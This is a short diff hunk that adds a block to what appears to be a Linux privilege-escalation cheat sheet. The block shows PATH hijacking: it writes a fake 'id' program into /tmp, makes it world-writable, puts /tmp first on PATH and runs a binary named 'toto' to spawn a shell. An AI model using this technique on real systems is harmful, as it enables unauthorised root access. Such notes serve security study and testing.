@@ -265,6 +265,19 @@
 	ln -s /bin/sh cp
 ```
 
+
+```
+	echo "/bin/bash" > /tmp/id
+	
+	chmod 777 /tmp/id
+	
+	export PATH=/tmp:$PATH
+	
+	./toto
+	
+```
+
+
 - bash < 4.2
 	
 ```
